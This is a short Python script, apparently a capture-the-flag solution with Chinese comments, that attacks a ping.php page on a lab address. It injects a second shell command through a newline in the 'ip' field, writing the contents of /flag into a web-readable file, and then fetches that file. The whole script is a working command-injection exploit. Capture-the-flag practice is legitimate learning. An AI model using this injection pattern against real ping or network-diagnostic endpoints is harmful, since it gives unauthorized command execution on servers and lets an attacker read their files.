import requests

url = 'http://172.17.0.15:14939/ping.php' # 替换成实际的IP和端口号 data = {'key1': 'value1', 'key2': 'value2'} # 设置要发送的数据
str="127.0.0.1\ncat /flag > 1.txt"
data={'ip':str}
response = requests.post(url, data=data)

#print(response.text) # 输出服务器返回的响应数据
print(requests.post("http://172.17.0.15:14939/1.txt").text)
